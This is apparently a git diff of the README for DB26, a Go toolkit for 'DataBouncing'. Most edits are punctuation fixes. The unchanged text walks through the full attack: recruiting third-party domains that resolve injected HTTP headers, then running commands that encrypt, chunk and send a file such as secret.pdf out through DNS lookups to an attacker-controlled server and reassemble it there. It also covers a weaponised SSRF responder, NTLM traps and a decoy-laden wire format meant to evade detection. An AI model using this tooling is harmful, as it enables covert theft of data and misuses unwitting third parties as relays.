@@ -1,8 +1,8 @@
 # DB26: DataBouncing Toolkit
 
-**Indirect data exfiltration. Data enters as HTTP headers via TCP/HTTPS to legitimate third-party domains. Those domains process the headers, triggering UDP/DNS lookups that carry the data to the receiver. The sender never touches DNS — the third party exfiltrates the data on the sender's behalf without knowing it.**
+**Indirect data exfiltration. Data enters as HTTP headers via TCP/HTTPS to legitimate third-party domains. Those domains process the headers, triggering UDP/DNS lookups that carry the data to the receiver. The sender never touches DNS - the third party exfiltrates the data on the sender's behalf without knowing it.**
 
-DataBouncing created by [John Carroll](https://thecontractor.io/data-bouncing/) and [David Mound](https://databouncing.io) — David was instrumental in the initial discovery. First public tooling implementation by [Nick Dunn](https://github.com/N1ckDunn/DataBouncing). This is a complete Go reimplementation with significant performance and operational improvements.
+DataBouncing created by [John Carroll](https://thecontractor.io/data-bouncing/) and [David Mound](https://databouncing.io) - David was instrumental in the initial discovery. First public tooling implementation by [Nick Dunn](https://github.com/N1ckDunn/DataBouncing). This is a complete Go reimplementation with significant performance and operational improvements.
 
 ## How It Works
 
@@ -41,9 +41,9 @@ HTTP headers like `Host`, `X-Forwarded-For`, and `Referer` are processed by web 
 ```
 DB26/
 ├── cmd/
-│   ├── recruiter/        # Candidate discovery — finds proven domain+header pairs
-│   ├── db26-send/        # Sender — encrypts, chunks, shuffles, bounces data
-│   ├── db26-recv/        # Receiver — collects, deshuffles, reassembles, decrypts
+│   ├── recruiter/        # Candidate discovery - finds proven domain+header pairs
+│   ├── db26-send/        # Sender - encrypts, chunks, shuffles, bounces data
+│   ├── db26-recv/        # Receiver - collects, deshuffles, reassembles, decrypts
 │   ├── responder/        # Weaponised HTTP/HTTPS response server (SSRF/auth)
 │   ├── report/           # JSONL report generator from run data
 │   ├── ntlmtrap/         # NTLM/Basic auth challenge server
@@ -53,7 +53,7 @@ DB26/
 ├── internal/
 │   ├── config/           # CLI flag parsing and validation
 │   ├── headers/          # HTTP header definitions (15 injection positions)
-│   ├── probe/            # fasthttp client — fire-and-forget HTTP probes
+│   ├── probe/            # fasthttp client - fire-and-forget HTTP probes
 │   ├── worker/           # Goroutine pool with rate limiting
 │   ├── callback/         # Interactsh interaction parsing
 │   ├── correlate/        # Match DNS callbacks to probed domains
@@ -61,7 +61,7 @@ DB26/
 │   ├── auth/             # NTLM/Basic/Negotiate/Digest detection
 │   ├── crypto/           # AES-256-GCM encryption + Argon2id key derivation
 │   ├── wire/             # Wire format: shuffled fields, decoys, Base32, chunking
-│   ├── intel/            # IP intelligence — ASN, GeoIP, reverse DNS, classification
+│   ├── intel/            # IP intelligence - ASN, GeoIP, reverse DNS, classification
 │   ├── payloads/         # Polyglot payloads for SSRF/SSTI/XXE technology detection
 │   ├── metrics/          # Atomic counters for real-time stats
 │   ├── output/           # JSONL file writers
@@ -79,7 +79,7 @@ DB26/
 
 ## Infrastructure Requirements
 
-You need an **OOB server that you control**. This is non-negotiable — the receiver reads data from the server's logs.
+You need an **OOB server that you control**. This is non-negotiable - the receiver reads data from the server's logs.
 
 **Recommended: Self-hosted [Interactsh](https://github.com/projectdiscovery/interactsh)**
 - You own the domain, the server, and the logs
@@ -91,9 +91,9 @@ You need an **OOB server that you control**. This is non-negotiable — the rece
 - Custom DNS server that logs all queries
 
 **Will NOT work:**
-- **Burp Collaborator (default)** — You don't control the server or have raw log access. The receiver needs to parse DNS query data from the server log. If you must use Collaborator, you need Burp Suite Pro with a [private Collaborator server](https://portswigger.net/burp/documentation/collaborator/deploying) that you host yourself and can access the logs.
-- **Public interact.sh** — Same problem. You can't read the server-side log. The polling API doesn't reliably deliver all interactions under load.
-- **Any OOB service where you only get notifications** — The receiver needs the raw DNS query content, not just "a query was received."
+- **Burp Collaborator (default)** - You don't control the server or have raw log access. The receiver needs to parse DNS query data from the server log. If you must use Collaborator, you need Burp Suite Pro with a [private Collaborator server](https://portswigger.net/burp/documentation/collaborator/deploying) that you host yourself and can access the logs.
+- **Public interact.sh** - Same problem. You can't read the server-side log. The polling API doesn't reliably deliver all interactions under load.
+- **Any OOB service where you only get notifications** - The receiver needs the raw DNS query content, not just "a query was received."
 
 **The key requirement:** You must be able to read the full DNS query (including all subdomain labels) from the server log. That's where the data is.
 
@@ -118,19 +118,19 @@ go build -o db26-send  ./cmd/db26-send/
 go build -o db26-recv  ./cmd/db26-recv/
 ```
 
-### 1. Recruit — Find proven bounce points
+### 1. Recruit - Find proven bounce points
 
 ```bash
 ./recruiter -d domains.txt -s https://your-oob.domain -t <token> \
   --run-dir ./runs/$(date +%Y%m%d) -w 2000 --rps 5000 --timeout 1 -v
 ```
 
-Output: `databouncing_candidates.jsonl` — domain + proven header pairs:
+Output: `databouncing_candidates.jsonl` - domain + proven header pairs:
 ```json
 {"domain":"example.com","headers":{"host":3,"xff":1},"callbacks":4}
 ```
 
-### 2. Send — Exfiltrate data through proven candidates
+### 2. Send - Exfiltrate data through proven candidates
 
 ```bash
 ./db26-send -file secret.pdf -passphrase "strong-key" \
@@ -146,7 +146,7 @@ Or target specific domains manually:
   -corr-ids <id>
 ```
 
-### 3. Receive — Collect and reassemble
+### 3. Receive - Collect and reassemble
 
 ```bash
 ./db26-recv -passphrase "strong-key" \
@@ -177,11 +177,11 @@ recruiter [flags]
 | `--grace` | `60` | Seconds to wait after probing for late DNS callbacks |
 | `--run-dir` | from config | Output directory for this run's reports |
 | `--https` | `true` | Also probe HTTPS (doubles probes, set `false` to skip) |
-| `--oob-domain` | — | Use a pre-registered OOB domain instead of auto-registering |
+| `--oob-domain` | - | Use a pre-registered OOB domain instead of auto-registering |
 | `--verify-headers` | `false` | Print headers for 3 domains and exit (debug mode) |
 | `-v`, `--verbose` | `false` | Verbose output |
 
-**Config file** (`~/.db26/config.json`) provides defaults for server, token, run-dir, and paths — so most flags are optional if configured.
+**Config file** (`~/.db26/config.json`) provides defaults for server, token, run-dir, and paths - so most flags are optional if configured.
 
 ### db26-send
 
@@ -195,8 +195,8 @@ db26-send [flags]
 |------|---------|-------------|
 | `-file` | *required* | File to exfiltrate |
 | `-passphrase` | *required* | Encryption passphrase (shared with receiver) |
-| `-candidates` | — | Proven candidates JSONL from recruiter |
-| `-target` | — | Manual targets: `domain,header,domain,header,...` |
+| `-candidates` | - | Proven candidates JSONL from recruiter |
+| `-target` | - | Manual targets: `domain,header,domain,header,...` |
 | `-corr-ids` | *required* | Correlation IDs (comma-separated, one per OOB domain) |
 | `-oob-domains` | `oob.yourdomain.com` | OOB domains (comma-separated) |
 | `-retries` | `5` | Send each chunk through N different candidates |
@@ -239,7 +239,7 @@ db26-recv [flags]
 | `-salt` | *required* | Session salt hex (printed by sender) |
 | `-corr-ids` | *required* | Correlation IDs (comma-separated) |
 | `-oob-domains` | `oob.yourdomain.com` | OOB domains (comma-separated) |
-| `-file-id` | — | Extract specific file ID (hex). Omit to extract all |
+| `-file-id` | - | Extract specific file ID (hex). Omit to extract all |
 | `-log` | `/var/log/interactsh/interactsh.log` | Path to interactsh server log |
 | `-output` | `.` | Output directory for reassembled files |
 | `-enrich` | `false` | Enrich resolver IPs with ASN/Geo/rDNS intel |
@@ -293,7 +293,7 @@ Shuffled:  [base32data].[total].[fileID].[seq].[corrID].[oob.domain]
 With decoy: [seq].[DECOY].[base32data].[fileID].[total].[corrID].[oob.domain]
 ```
 
-Fields identified by **unique length** — no fixed format signature:
+Fields identified by **unique length** - no fixed format signature:
 
 | Field | Length | Varies per session |
 |-------|--------|--------------------|
@@ -335,17 +335,17 @@ Different encryption key = different field lengths = zero cross-session pattern.
 
 ## Encryption
 
-- **AES-256-GCM** — Authenticated encryption (confidentiality + integrity)
-- **Argon2id** — Memory-hard key derivation (64MB, 3 iterations, 4 threads)
-- **SHA-256** — File integrity checksums
-- **12-byte random nonce** — Per encryption operation
-- **Base32 (RFC 4648)** — DNS-safe encoding, case-insensitive
+- **AES-256-GCM** - Authenticated encryption (confidentiality + integrity)
+- **Argon2id** - Memory-hard key derivation (64MB, 3 iterations, 4 threads)
+- **SHA-256** - File integrity checksums
+- **12-byte random nonce** - Per encryption operation
+- **Base32 (RFC 4648)** - DNS-safe encoding, case-insensitive
 
 ## Infrastructure
 
-- **[Interactsh](https://github.com/projectdiscovery/interactsh)** — OOB callback server (DNS/HTTP/HTTPS/SMTP)
-- **[Subfinder](https://github.com/projectdiscovery/subfinder)** — Passive subdomain enumeration
-- **[fasthttp](https://github.com/valyala/fasthttp)** — High-performance HTTP client
+- **[Interactsh](https://github.com/projectdiscovery/interactsh)** - OOB callback server (DNS/HTTP/HTTPS/SMTP)
+- **[Subfinder](https://github.com/projectdiscovery/subfinder)** - Passive subdomain enumeration
+- **[fasthttp](https://github.com/valyala/fasthttp)** - High-performance HTTP client
 
 ## Credits
 
